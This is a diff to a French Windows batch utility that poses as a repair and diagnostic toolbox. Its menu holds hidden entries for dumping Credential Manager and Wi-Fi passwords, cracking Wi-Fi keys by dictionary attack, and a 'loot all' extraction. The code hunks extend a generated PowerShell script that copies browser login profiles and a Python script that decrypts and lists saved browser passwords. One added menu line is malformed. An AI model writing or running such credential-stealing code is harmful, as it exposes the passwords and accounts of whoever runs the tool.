@@ -180,7 +180,7 @@ set "t[89]=sys_av_test:Test Antivirus (EICAR Safe)~Tester votre antivirus"
 set "t[90]=res_restore_point:Creer un Point de Restauration~Recommande avant toute reparation:HIDDEN"
 set "t[93]=dump_credman:Credential Manager~Extraire les identifiants Windows:HIDDEN"
 set "t[94]=dump_wifi:Mots de passe Wi-Fi~Afficher ou exporter les SSID:HIDDEN"
-set "t[95]=sys_nirsoft_pw:Extracteur Navigateurs (Nirsoft)~Chrome, Edge, Firefox:HIDDEN"
+set "t[95]=sys_nirsoft_pw:Extracteur Navigateurs (Nirsoft)~Ancienne methode:HIDDEN"
 set "t[96]=wd_quick:Scan Rapide Defender~Analyse de securite rapide:HIDDEN"
 set "t[97]=wd_full:Scan Complet Defender~Analyse totale du systeme:HIDDEN"
 set "t[98]=wd_update:Mettre a jour Defender~Signatures de virus:HIDDEN"
@@ -243,7 +243,8 @@ set "t[154]=sys_loot_all:Extraction Finale LAN~Dump Wi-Fi, credentials et histor
 set "t[155]=net_wifi_scan:Scan Reseaux Wi-Fi~Analyse des reseaux environnants (SSID, BSSID, signal, securite):HIDDEN"
 set "t[156]=net_wifi_target:Analyser une Cible Wi-Fi~Informations detaillees sur un reseau selectionne:HIDDEN"
 set "t[157]=net_wifi_crack:Cracker la Cle Wi-Fi~Profils sauvegardes + attaque dictionnaire WPA2-PSK:HIDDEN"
-set "t[158]=dump_browser_local:Extracteur Navigateurs (Script)~Chrome, Edge - Dechiffrement DPAPI des identifiants et mots de passe:HIDDEN"
+set "t[158]=dump_browser_local:Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI:HIDDEN"
+set "t[159]=Chrome, Edge - Dechiffrement DPAPI des identifiants et mots de passe:HIDDEN"
 REM Auto-detection du nombre de scripts (plus besoin de mettre a jour manuellement)
 set "total_tools=0"
 for /l %%I in (1,1,500) do if defined t[%%I] set "total_tools=%%I"
@@ -296,8 +297,8 @@ set "map_res_explorer_restart=Redemarrer l'Explorateur~Sans redemarrer le PC"
 set "map_res_gpu_reset=Reinitialiser le GPU~Win+Ctrl+Shift+B"
 set "map_dump_credman=Credential Manager~Extraire les identifiants Windows"
 set "map_dump_wifi=Mots de passe Wi-Fi~Afficher ou exporter les SSID"
-set "map_sys_nirsoft_pw=Extracteur Navigateurs (Nirsoft)~Chrome, Edge, Firefox"
-set "map_dump_browser_local=Extracteur Navigateurs (Script)~Chrome, Edge - Dechiffrement DPAPI des identifiants et mots de passe"
+set "map_sys_nirsoft_pw=Extracteur Navigateurs (Nirsoft)~Ancienne methode"
+set "map_dump_browser_local=Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI"
 set "map_sys_win_key=Cle Windows~Retrouver la cle de licence Windows"
 set "map_sys_drivers=Export des Pilotes~Sauvegarde de tous les pilotes"
 set "map_sys_export_software=Liste des Logiciels~Exporter via Winget"
@@ -1461,7 +1462,7 @@ set "DBL_PS=%TEMP%\diag_browser_%RANDOM%.ps1"
 >> "%DBL_PS%" echo       $copied++
 >> "%DBL_PS%" echo     }
 >> "%DBL_PS%" echo   }
->> "%DBL_PS%" echo   $profiles = Get-ChildItem $b.Base -Directory -ErrorAction SilentlyContinue ^| Where-Object { Test-Path (Join-Path $_.FullName 'Login Data') }
+>> "%DBL_PS%" echo   $profiles = Get-ChildItem $b.Base -Directory -ErrorAction SilentlyContinue ^| Where-Object { (Test-Path (Join-Path $_.FullName 'Login Data')) -or ($_.Name -like 'Profile*') -or ($_.Name -eq 'Default') }
 >> "%DBL_PS%" echo   foreach ($prof in $profiles) {
 >> "%DBL_PS%" echo     $dest = Join-Path $bDest $prof.Name
 >> "%DBL_PS%" echo     New-Item -ItemType Directory -Path $dest -Force ^| Out-Null
@@ -1603,13 +1604,15 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo     return res
 >> "!PY_FILE!" echo def main():
 >> "!PY_FILE!" echo     if not BASE_DIR.exists(): sys.exit("  DiagNav introuvable")
->> "!PY_FILE!" echo     raw = []
->> "!PY_FILE!" echo     for b in BROWSERS: raw.extend(collect(b))
+>> "!PY_FILE!" echo     raw_by = {}
+>> "!PY_FILE!" echo     for b in BROWSERS: raw_by[b] = collect(b)
+>> "!PY_FILE!" echo     raw = [e for v in raw_by.values() for e in v]
 >> "!PY_FILE!" echo     seen = set(); unique = []
 >> "!PY_FILE!" echo     for url, user, pw in raw:
 >> "!PY_FILE!" echo         sig = (url.lower(), user.lower(), pw)
 >> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
->> "!PY_FILE!" echo     print(f"  [+] {len(unique)} identifiant(s) uniques  /  {len(raw)-len(unique)} doublon(s) ignores")
+>> "!PY_FILE!" echo     for b in BROWSERS: print(f"  [{b}] {len(raw_by[b])} identifiant(s)")
+>> "!PY_FILE!" echo     print(f"  [+] Total : {len(unique)} uniques  /  {len(raw)-len(unique)} doublon(s) ignores")
 >> "!PY_FILE!" echo     if not unique:
 >> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
 >> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
